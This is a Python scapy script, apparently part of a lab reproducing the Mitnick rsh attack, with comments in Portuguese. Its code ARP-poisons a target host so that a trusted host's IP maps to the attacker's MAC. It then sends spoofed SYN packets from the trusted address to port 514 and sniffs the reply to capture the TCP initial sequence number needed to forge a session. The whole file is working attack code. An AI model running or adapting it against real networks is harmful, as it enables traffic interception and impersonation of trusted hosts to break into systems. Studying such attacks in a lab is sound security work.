import random
import socket
import time

from scapy.all import ARP, AsyncSniffer, Ether, IP, TCP, get_if_hwaddr, getmacbyip, send, sendp

XTERMINAL_IP = "10.0.2.20"
TRUSTED_IP = "10.0.2.30"
TARGET_PORT = 514
MAX_ATTEMPTS = 4
SNIFF_TIMEOUT = 5


def _wait_target_ready(timeout: float = 12.0) -> bool:
    """
    Aguarda o xTerminal aceitar conexoes TCP na porta 514.
    Evita falhas intermitentes quando o container acabou de subir.
    """
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            socket.create_connection((XTERMINAL_IP, TARGET_PORT), timeout=0.8).close()
            return True
        except OSError:
            time.sleep(0.4)
    return False


def _arp_poison(target_ip: str, spoof_ip: str) -> None:
    """
    Envia ARP reply ao target dizendo que spoof_ip tem o MAC do atacante.
    Necessário em LAN switched: garante que o SYN-ACK chegue ao atacante
    em vez de ser descartado por falta de entrada ARP para spoof_ip.
    """
    attacker_mac = get_if_hwaddr("eth0")
    target_mac = getmacbyip(target_ip)
    if not target_mac:
        print(f"[!] MAC de {target_ip} não encontrado — usando broadcast.")
        target_mac = "ff:ff:ff:ff:ff:ff"
    pkt = Ether(dst=target_mac) / ARP(
        op=2,
        hwsrc=attacker_mac,
        psrc=spoof_ip,
        hwdst=target_mac,
        pdst=target_ip,
    )
    # Repeticoes aumentam a chance de atualizar a ARP table do alvo.
    sendp(pkt, verbose=False, count=3, inter=0.05)
    print(f"[+] ARP poison: {spoof_ip} → {attacker_mac} (enviado a {target_ip})")


def _capture_once(sport: int) -> tuple[int, int] | None:
    """
    Uma tentativa de captura do ISN.
    """
    _arp_poison(XTERMINAL_IP, TRUSTED_IP)
    time.sleep(0.15)

    sniffer = AsyncSniffer(
        iface="eth0",
        filter=f"src host {XTERMINAL_IP} and dst host {TRUSTED_IP} and tcp src port {TARGET_PORT} and tcp[13] == 18",
        count=1,
        timeout=SNIFF_TIMEOUT,
    )
    sniffer.start()
    time.sleep(0.15)

    syn = IP(dst=XTERMINAL_IP, src=TRUSTED_IP) / TCP(
        sport=sport,
        dport=TARGET_PORT,
        flags="S",
        seq=1000,
    )
    # Mais de um SYN reduz chance de perder janela de captura.
    send(syn, verbose=False, count=2, inter=0.05)

    sniffer.join()

    if not sniffer.results:
        return None

    syn_ack = sniffer.results[0]
    isn = syn_ack[TCP].seq
    return isn, sport


def capture_isn(src_port: int | None = None, attempts: int = MAX_ATTEMPTS) -> tuple[int, int] | None:
    """
    Envia SYN forjado (src=TRUSTED_IP) ao xTerminal e captura o ISN
    do SYN-ACK de resposta via sniff na LAN.
    Retorna (ISN, sport) ou None se não receber resposta.
    """
    if not _wait_target_ready():
        print("[-] xTerminal não ficou pronto na porta 514 dentro do tempo esperado.")
        return None

    for attempt in range(1, attempts + 1):
        sport = src_port or random.randint(512, 1023)
        print(f"[*] Tentativa {attempt}/{attempts} (sport={sport})")
        result = _capture_once(sport)
        if result is None:
            print("[-] Nenhum SYN-ACK capturado nesta tentativa.")
            time.sleep(0.5)
            continue

        isn, sport_used = result
        print(f"[+] SYN-ACK capturado de {XTERMINAL_IP}:{TARGET_PORT}")
        print(f"[+] ISN (seq do xTerminal): {isn}")
        print(f"[+] ACK esperado para completar handshake: {isn + 1}")
        return isn, sport_used

    print("[-] Falha após múltiplas tentativas de captura do ISN.")
    print("[-] Dica: valide se target/server estão Up e rode novamente.")
    return None


if __name__ == "__main__":
    capture_isn()
